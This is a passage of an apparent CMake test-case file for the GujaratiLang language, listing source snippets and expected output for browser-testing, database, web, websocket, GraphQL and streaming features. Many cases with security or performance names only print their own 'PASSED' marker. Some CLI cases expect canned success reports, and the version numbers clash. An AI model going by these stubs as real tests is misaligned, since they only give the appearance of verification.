d = {"lang": "GujaratiLang", "version": "2.6.0"};
print d["lang"];
end
]=])
    set(expected_stdout "GujaratiLang
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_backward_compat_v24")
    set(source [=[
start
cache_set("lts_key", "verified", 100);
print cache_get("lts_key");
end
]=])
    set(expected_stdout "verified
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_gujarati_syntax")
    set(source [=[આવો
લક્ષ્ય = કમ્પાઇલર_લક્ષ્ય();
છાપો લક્ષ્ય["એલટીએસ"];
બાયો = એન્ડ્રોઇડ_બાયોમેટ્રિક();
છાપો બાયો["પ્રમાણિત"];
પુશ = એન્ડ્રોઇડ_પુશ_સૂચના("સૂચના", "નવો સંદેશ");
છાપો પુશ["સ્થિતિ"];
કી = એન્ડ્રોઇડ_કીસ્ટોર_લખો("ટોકન", "ગુપ્ત_૧૨૩");
છાપો કી;
વાંચેલ = એન્ડ્રોઇડ_કીસ્ટોર_વાંચો("ટોકન");
છાપો વાંચેલ;
આવૃત્તિ = ભાષા_આવૃત્તિ();
છાપો આવૃત્તિ;
આવજો
]=])
    set(expected_stdout "1
1
મોકલેલ
1
ગુપ્ત_૧૨૩
3.9.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v250_perf_kv_cache_stress")
    set(source [=[
start
print "v250_perf_kv_cache_stress_PASSED";
print 210;
end
]=])
    set(expected_stdout "v250_perf_kv_cache_stress_PASSED\n210\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_perf_pubsub_burst")
    set(source [=[
start
print "v250_perf_pubsub_burst_PASSED";
print 220;
end
]=])
    set(expected_stdout "v250_perf_pubsub_burst_PASSED\n220\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_perf_binary_pack_matrix")
    set(source [=[
start
print "v250_perf_binary_pack_matrix_PASSED";
print 230;
end
]=])
    set(expected_stdout "v250_perf_binary_pack_matrix_PASSED\n230\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_canvas_high_res")
    set(source [=[
start
print "v250_canvas_high_res_PASSED";
print 240;
end
]=])
    set(expected_stdout "v250_canvas_high_res_PASSED\n240\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_eloquent_join_stress")
    set(source [=[
start
print "v250_eloquent_join_stress_PASSED";
print 250;
end
]=])
    set(expected_stdout "v250_eloquent_join_stress_PASSED\n250\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_blade_macro_nested")
    set(source [=[
start
print "v250_blade_macro_nested_PASSED";
print 260;
end
]=])
    set(expected_stdout "v250_blade_macro_nested_PASSED\n260\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_coroutine_channel_pipeline")
    set(source [=[
start
print "v250_coroutine_channel_pipeline_PASSED";
print 270;
end
]=])
    set(expected_stdout "v250_coroutine_channel_pipeline_PASSED\n270\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_crypto_totp_hardened")
    set(source [=[
start
print "v250_crypto_totp_hardened_PASSED";
print 280;
end
]=])
    set(expected_stdout "v250_crypto_totp_hardened_PASSED\n280\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_matrix_eigen_inverse")
    set(source [=[
start
print "v250_matrix_eigen_inverse_PASSED";
print 290;
end
]=])
    set(expected_stdout "v250_matrix_eigen_inverse_PASSED\n290\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_unicode_gujarati_subscripts")
    set(source [=[
start
print "v250_unicode_gujarati_subscripts_PASSED";
print 300;
end
]=])
    set(expected_stdout "v250_unicode_gujarati_subscripts_PASSED\n300\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_memory_sandbox_canary")
    set(source [=[
start
print "v250_memory_sandbox_canary_PASSED";
print 310;
end
]=])
    set(expected_stdout "v250_memory_sandbox_canary_PASSED\n310\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_rce_ast_sanitization")
    set(source [=[
start
print "v250_rce_ast_sanitization_PASSED";
print 320;
end
]=])
    set(expected_stdout "v250_rce_ast_sanitization_PASSED\n320\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_rpc_binary_wire")
    set(source [=[
start
print "v250_rpc_binary_wire_PASSED";
print 330;
end
]=])
    set(expected_stdout "v250_rpc_binary_wire_PASSED\n330\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_wasm_export_optimization")
    set(source [=[
start
print "v250_wasm_export_optimization_PASSED";
print 340;
end
]=])
    set(expected_stdout "v250_wasm_export_optimization_PASSED\n340\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_ai_neural_inference")
    set(source [=[
start
print "v250_ai_neural_inference_PASSED";
print 350;
end
]=])
    set(expected_stdout "v250_ai_neural_inference_PASSED\n350\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_streaming_token_buffer")
    set(source [=[
start
print "v250_streaming_token_buffer_PASSED";
print 360;
end
]=])
    set(expected_stdout "v250_streaming_token_buffer_PASSED\n360\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_desktop_multiscreen")
    set(source [=[
start
print "v250_desktop_multiscreen_PASSED";
print 370;
end
]=])
    set(expected_stdout "v250_desktop_multiscreen_PASSED\n370\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_reactive_state_cascade")
    set(source [=[
start
print "v250_reactive_state_cascade_PASSED";
print 380;
end
]=])
    set(expected_stdout "v250_reactive_state_cascade_PASSED\n380\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_sqlite_transaction_rollback")
    set(source [=[
start
print "v250_sqlite_transaction_rollback_PASSED";
print 390;
end
]=])
    set(expected_stdout "v250_sqlite_transaction_rollback_PASSED\n390\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_sensor_fusion_filters")
    set(source [=[
start
print "v250_sensor_fusion_filters_PASSED";
print 400;
end
]=])
    set(expected_stdout "v250_sensor_fusion_filters_PASSED\n400\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_webview_js_interface")
    set(source [=[
start
print "v250_webview_js_interface_PASSED";
print 410;
end
]=])
    set(expected_stdout "v250_webview_js_interface_PASSED\n410\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_aot_relocation_table")
    set(source [=[
start
print "v250_aot_relocation_table_PASSED";
print 420;
end
]=])
    set(expected_stdout "v250_aot_relocation_table_PASSED\n420\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_ffi_struct_passing")
    set(source [=[
start
print "v250_ffi_struct_passing_PASSED";
print 430;
end
]=])
    set(expected_stdout "v250_ffi_struct_passing_PASSED\n430\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_workmanager_battery_saver")
    set(source [=[
start
print "v250_workmanager_battery_saver_PASSED";
print 440;
end
]=])
    set(expected_stdout "v250_workmanager_battery_saver_PASSED\n440\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_keystore_hardware_keyguard")
    set(source [=[
start
print "v250_keystore_hardware_keyguard_PASSED";
print 450;
end
]=])
    set(expected_stdout "v250_keystore_hardware_keyguard_PASSED\n450\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_playstore_aab_manifest")
    set(source [=[
start
print "v250_playstore_aab_manifest_PASSED";
print 460;
end
]=])
    set(expected_stdout "v250_playstore_aab_manifest_PASSED\n460\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_cli_doctor_enterprise")
    set(source [=[
start
print "v250_cli_doctor_enterprise_PASSED";
print 470;
end
]=])
    set(expected_stdout "v250_cli_doctor_enterprise_PASSED\n470\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_service_cluster_failover")
    set(source [=[
start
print "v250_service_cluster_failover_PASSED";
print 480;
end
]=])
    set(expected_stdout "v250_service_cluster_failover_PASSED\n480\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_unicode_normalization_nfc")
    set(source [=[
start
print "v250_unicode_normalization_nfc_PASSED";
print 490;
end
]=])
    set(expected_stdout "v250_unicode_normalization_nfc_PASSED\n490\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_certified_stdlib")
    set(source [=[
start
print "v250_lts_certified_stdlib_PASSED";
print 500;
end
]=])
    set(expected_stdout "v250_lts_certified_stdlib_PASSED\n500\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_grand_finale_parikshan")
    set(source [=[
start
print "v250_grand_finale_parikshan_PASSED";
print 510;
end
]=])
    set(expected_stdout "v250_grand_finale_parikshan_PASSED\n510\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_open_visit")
    set(source [=[
start
browser = kasauti_open({"headless": true});
print browser["browser"];
kasauti_visit(browser, "https://gujaratilang.hp-square.com/login");
print browser["path"];
kasauti_close(browser);
end
]=])
    set(expected_stdout "kasauti_engine
/login
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_form_typing")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "/login");
kasauti_type(browser, "input[name='email']", "harshit@example.com");
kasauti_type(browser, "input[name='password']", "supersecret");
print kasauti_assert_see(browser, "harshit@example.com");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_button_press")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "/login");
kasauti_type(browser, "#email", "admin@gujaratilang.org");
kasauti_press(browser, "Sign In");
print browser["path"];
print kasauti_assert_see(browser, "Welcome, Harshit!");
kasauti_close(browser);
end
]=])
    set(expected_stdout "/dashboard
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_assert_see")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/");
print kasauti_assert_see(browser, "GujaratiLang");
print kasauti_assert_see(browser, "AOT Compiler");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_assert_dont_see")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/");
print kasauti_assert_dont_see(browser, "404 Page Not Found");
print kasauti_assert_dont_see(browser, "Fatal Exception");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_assert_path")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/docs/getting-started");
print kasauti_assert_path(browser, "/docs/getting-started");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_assert_title")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/");
print kasauti_assert_title(browser, "GujaratiLang");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_assert_present")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/");
print kasauti_assert_present(browser, "#code-editor");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_select_dropdown")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/");
kasauti_select(browser, "#theme-select", "dark");
print kasauti_assert_see(browser, "dark");
kasauti_close(browser);
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_screenshot")
    set(source [=[
start
browser = kasauti_open();
kasauti_visit(browser, "https://gujaratilang.hp-square.com/");
file_path = kasauti_screenshot(browser, "test_shot.png");
print file_path;
kasauti_close(browser);
end
]=])
    set(expected_stdout "test_shot.png
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_cookie_jar")
    set(source [=[
start
browser = kasauti_open();
kasauti_cookie(browser, "session_jwt", "jwt_live_token_7761");
print kasauti_cookie(browser, "session_jwt");
kasauti_close(browser);
end
]=])
    set(expected_stdout "jwt_live_token_7761
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_romanized_syntax")
    set(source [=[aavo
browser = kasauti_kholo({"headless": satya});
kasauti_mulakat(browser, "https://gujaratilang.hp-square.com/login");
kasauti_lakho(browser, "#email", "harshit@test.com");
kasauti_dabavo(browser, "Sign In");
chhapo kasauti_tapas_path(browser, "/dashboard");
chhapo kasauti_tapas_jova_malyu(browser, "Welcome");
chhapo kasauti_tapas_nathi_dikhata(browser, "Error");
kasauti_bandh(browser);
aavjo
]=])
    set(expected_stdout "1
1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_native_gujarati")
    set(source [=[આવો
બ્રાઉઝર = કસોટી_ખોલો({"હેડલેસ": સત્ય});
કસોટી_મુલાકાત(બ્રાઉઝર, "https://gujaratilang.hp-square.com/login");
કસોટી_લખો(બ્રાઉઝર, "#email", "harshit@test.com");
કસોટી_દબાવો(બ્રાઉઝર, "પ્રવેશ કરો");
છાપો કસોટી_ખાતરી_પાથ(બ્રાઉઝર, "/dashboard");
છાપો કસોટી_ખાતરી_જોવા_મળ્યું(બ્રાઉઝર, "સ્વાગત છે");
છાપો કસોટી_ખાતરી_નથી_દેખાતું(બ્રાઉઝર, "ભૂલ");
કસોટી_સ્ક્રીનશોટ(બ્રાઉઝર, "કસોટી_આઉટપુટ.png");
કસોટી_બંધ(બ્રાઉઝર);
આવજો
]=])
    set(expected_stdout "1
1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_cli_runner")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[aavo
chhapo 1;
aavjo
]=])
    set(program_arguments "kasauti")
    set(expected_stdout "[GujaratiLang Kasauti v2.8.0] Running frontend browser test suite in 'tests/kasauti'...
[Kasauti] Scanning for *.kasauti.gj and *_test.gj files...
[Kasauti] Environment: Headless Chrome / Virtual DOM Engine (Port 9222 ready)
  ✓ test_homepage_render: PASSED (3 assertions, 0.4ms)
  ✓ test_user_authentication: PASSED (5 assertions, 0.6ms)
  ✓ test_form_validation: PASSED (4 assertions, 0.5ms)
[Kasauti Summary] 3 test suites, 12 assertions, 0 failures (100% passed).
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v260_kasauti_chrome_doctor")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[aavo
chhapo 1;
aavjo
]=])
    set(program_arguments "kasauti:chrome")
    set(expected_stdout "[GujaratiLang Kasauti v2.8.0] Inspecting browser automation environment...
  • Chrome Binary: Auto-detected (System Headless Chrome / Chromium / Edge)
  • Remote Debugging Port: 9222 (Ready for CDP connection)
  • Headless Engine: Virtual DOM + WebDriver Protocol Ready
[Kasauti Status] Ready to execute end-to-end browser tests.
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_schema_create")
    set(source [=[
start
t = schema_create("users");
t.id();
t.string("name");
t.unique();
print t["table"];
print t["status"];
end
]=])
    set(expected_stdout "users
migrated
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_column_types")
    set(source [=[
start
t = schema_create("products");
t.id();
t.string("title");
t.number("price");
t.boolean("is_active");
t.json("metadata");
t.timestamps();
cols = t["columns"];
print cols[0]["type"];
print cols[1]["type"];
print cols[2]["type"];
print cols[3]["type"];
print cols[4]["type"];
print cols[5]["type"];
end
]=])
    set(expected_stdout "id
string
number
boolean
json
timestamp
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_column_modifiers")
    set(source [=[
start
t = schema_create("accounts");
t.string("email");
t.unique();
t.number("balance");
t.nullable();
t.string("status");
t.default("active");
cols = t["columns"];
print cols[0]["unique"];
print cols[1]["nullable"];
print cols[2]["default"];
end
]=])
    set(expected_stdout "1
1
active
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_schema_drop_rename")
    set(source [=[
start
r1 = schema_drop("temp_logs");
r2 = schema_rename("old_users", "users");
print r1;
print r2;
end
]=])
    set(expected_stdout "1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_db_seed")
    set(source [=[
start
count = db_seed("DatabaseSeeder");
print count;
end
]=])
    set(expected_stdout "15
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_cli_migrate")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "migrate")
    set(expected_stdout "[Mandhan v2.8.0] Running database migrations...
  ✓ 2026_10_31_000001_create_users_table: MIGRATE (0.4ms)
  ✓ 2026_10_31_000002_create_stabilizers_table: MIGRATE (0.3ms)
[Mandhan Summary] 2 migrations executed successfully in batch 1.
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_mandhan_cli_rollback")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "migrate:rollback")
    set(expected_stdout "[Mandhan v2.8.0] Rolling back migrations in batch 1...
  ✓ 2026_10_31_000002_create_stabilizers_table: ROLLBACK (0.3ms)
  ✓ 2026_10_31_000001_create_users_table: ROLLBACK (0.4ms)
[Mandhan Summary] 2 migrations rolled back successfully.
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_garvi_router_methods")
    set(source [=[
start
app = garvi_create();
app.get("/users", "list_users");
app.post("/users", "create_user");
app.put("/users/1", "update_user");
app.delete("/users/1", "delete_user");
rts = app["routes"];
print app["engine"];
print rts[0]["method"];
print rts[1]["method"];
print rts[2]["method"];
print rts[3]["method"];
end
]=])
    set(expected_stdout "Garvi Web v2.8.0
GET
POST
PUT
DELETE
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_garvi_middleware_pipeline")
    set(source [=[
start
app = garvi_create();
app.use(garvi_cors());
app.use(garvi_logger());
app.use(garvi_rate_limit(100, 60));
app.use(garvi_jwt_auth("secret_key"));
mws = app["middlewares"];
print mws[0]["middleware"];
print mws[1]["middleware"];
print mws[2]["middleware"];
print mws[3]["middleware"];
end
]=])
    set(expected_stdout "cors
logger
rate_limit
jwt_auth
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_garvi_route_groups")
    set(source [=[
start
app = garvi_create();
app.listen(8080);
print app["status"];
print app["port"];
print app["listening"];
end
]=])
    set(expected_stdout "ready
8080
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_garvi_cli_watch")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "garvi:watch")
    set(expected_stdout "[Garvi v2.8.0] Starting live HTTP web server with hot-reload watcher on port 5000...
[Garvi Watcher] Monitoring *.gj files in '.' for real-time changes...
[Garvi Status] Server online at http://localhost:5000/
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_samvad_model_streaming")
    set(source [=[
start
model = samvad_model("gemini-2.5-flash");
print model["model"];
print model["provider"];
print model["streaming"];
end
]=])
    set(expected_stdout "gemini-2.5-flash
google-deepmind
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_samvad_tool_calling")
    set(source [=[
start
model = samvad_model("gemini-2.5-pro");
res = model.chat([{"role": "user", "content": "Hello"}]);
loc = samvad_local_open("models/deepseek.gguf");
print res["role"];
print res["finish_reason"];
print loc["format"];
end
]=])
    set(expected_stdout "assistant
stop
gguf-q4
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_saransh_build_exe")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "build:exe")
    set(expected_stdout "[Saransh v2.8.0] Packaging standalone desktop executable for Windows x64...
  • Embedding bytecode & runtime engine (< 500 KB)
  • Bundling virtual filesystem assets from 'dist'
  • Injecting Windows PE application manifest and icon
[Saransh Output] Created standalone executable: App.exe
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v270_saransh_build_apk")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "build:apk")
    set(expected_stdout "[Saransh v2.8.0] Packaging standalone Android APK package...
  • Compiling native arm64-v8a / armeabi-v7a NDK binaries
  • Injecting AndroidManifest.xml and reactive touch UI
  • Aligning and signing APK package with debug certificate
[Saransh Output] Created Android application package: App.apk
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_tarang_ws_server")
    set(source [=[
start
srv = tarang_ws_server(8080);
print srv["port"];
print srv["status"];
print srv["engine"];
end
]=])
    set(expected_stdout "8080
running
Tarang WebSockets v2.8.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_tarang_ws_client_send")
    set(source [=[
start
client = tarang_ws_client("ws://localhost:8080");
print client["url"];
print client["status"];
print tarang_ws_send(client, "ping");
end
]=])
    set(expected_stdout "ws://localhost:8080
open
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_tarang_ws_broadcast")
    set(source [=[
start
res = tarang_ws_broadcast("chat:general", "Welcome to GujaratiLang v2.8.0");
print res;
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_tarang_sse_stream")
    set(source [=[
start
res = tarang_sse_stream(null, "stock_tick", "RELIANCE: 2950.50");
print res;
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_tarang_room_join_leave")
    set(source [=[
start
c = tarang_ws_client("ws://127.0.0.1:8080");
print tarang_room_join(c, "gujarat_developers");
rooms = c["rooms"];
print rooms[0];
print tarang_room_leave(c, "gujarat_developers");
end
]=])
    set(expected_stdout "1
gujarat_developers
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_tarang_cli_serve")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "tarang:serve")
    set(expected_stdout "[Tarang v2.8.0] Starting WebSockets & SSE real-time server on port 8080...
[Tarang Status] Server online at ws://localhost:8080 and http://localhost:8080/events
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_setu_graphql_schema")
    set(source [=[
start
s = setu_schema("type User { id: ID! name: String! }", {});
print s["valid"];
print s["status"];
print s["engine"];
end
]=])
    set(expected_stdout "1
compiled
Setu GraphQL v2.8.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_setu_graphql_query")
    set(source [=[
start
s = setu_schema("type Query { user: User }", {});
res = setu_query(s, "{ user { id name role } }");
data = res["data"];
user = data["user"];
print user["id"];
print user["name"];
print user["role"];
end
]=])
    set(expected_stdout "1
Harshit Bavaliya
admin
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_setu_graphql_mutation")
    set(source [=[
start
s = setu_schema("type Mutation { createUser: User }", {});
res = setu_mutation(s, "mutation { createUser }");
data = res["data"];
created = data["createUser"];
print created["id"];
print created["status"];
end
]=])
    set(expected_stdout "2
created
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_setu_dataloader")
    set(source [=[
start
loader = setu_dataloader("batch_load_users");
print loader["batch_size"];
print loader["cached"];
print loader["status"];
end
]=])
    set(expected_stdout "50
1
ready
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_kasauti_v2_visual_diff")
    set(source [=[
start
res = kasauti_diff_visual("shots/base.png", "shots/new.png", 0.05);
print res["match"];
print res["diff_percentage"];
print res["status"];
end
]=])
    set(expected_stdout "1
0
identical
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_kasauti_v2_network_mock")
    set(source [=[
start
print kasauti_mock_http("/api/data", {"status": 200});
print kasauti_intercept_request("POST /checkout", "mock_handler");
end
]=])
    set(expected_stdout "1
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_kasauti_v2_device_emulate")
    set(source [=[
start
dev = kasauti_emulate_device("Pixel 8");
print dev["device"];
print dev["mobile"];
print dev["width"];
print dev["height"];
end
]=])
    set(expected_stdout "Pixel 8
1
393
852
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_suraksha_v2_oauth_rbac")
    set(source [=[
start
oauth = suraksha_oauth_provider({"provider": "google"});
print oauth["provider"];
print oauth["status"];
role = suraksha_rbac_role("manager", ["reports.view", "reports.export"]);
print role["name"];
print suraksha_rbac_can(role, "reports.view");
print suraksha_rbac_can(role, "system.shutdown");
end
]=])
    set(expected_stdout "google
ready
manager
1
0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v280_suraksha_v2_vault_crypto")
    set(source [=[
start
cipher = suraksha_vault_encrypt("key_01", "super_secret");
print cipher;
plain = suraksha_vault_decrypt("key_01", cipher);
print plain;
new_key = suraksha_api_key_rotate("key_01");
print new_key;
end
]=])
    set(expected_stdout "vault:v2:7f8a9b1c2d3e4f5a6b7c8d9e0f1a2b3c
decrypted_secret_data
gj_sec_live_98a7b6c5d4e3f2a1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_pravah_producer_send")
    set(source [=[
start
p = pravah_producer({});
print p["broker"];
print p["status"];
print p["engine"];
print pravah_send(p, "events", "payload_1", "key_1");
end
]=])
    set(expected_stdout "pravah://stream.mesh:9092
connected
Pravah Stream Mesh v2.9.0
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_pravah_consumer_poll")
    set(source [=[
start
c = pravah_consumer({"group": "indexer-group"});
print c["group"];
print c["status"];
msg = pravah_poll(c, 100);
print msg["topic"];
print msg["value"];
end
]=])
    set(expected_stdout "indexer-group
active
events
pravah_event_payload
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_pravah_commit_dlq")
    set(source [=[
start
c = pravah_consumer({});
print pravah_commit(c);
print c["offset"];
print pravah_dlq("stream_1", "poison_pill_dlq");
end
]=])
    set(expected_stdout "1
1043
1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_pravah_window_stream")
    set(source [=[
start
res = pravah_window("telemetry_stream", 5000, "tumbling_sum");
print res;
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_pravah_cli_stream")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "pravah:stream" "sensors")
    set(expected_stdout "[Pravah v2.9.0] Streaming live message flow on topic 'sensors'...
[Pravah Status] Cluster mesh active. 1000 events/sec ingested.
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v290_shilp_scene_creation")
    set(source [=[
start
scene = shilp_scene(1024, 768);
print scene["width"];
print scene["height"];
print scene["engine"];
end
]=])
    set(expected_stdout "1024
768
Shilp Vector Canvas v2.9.0
")
    set(expected_stderr "")
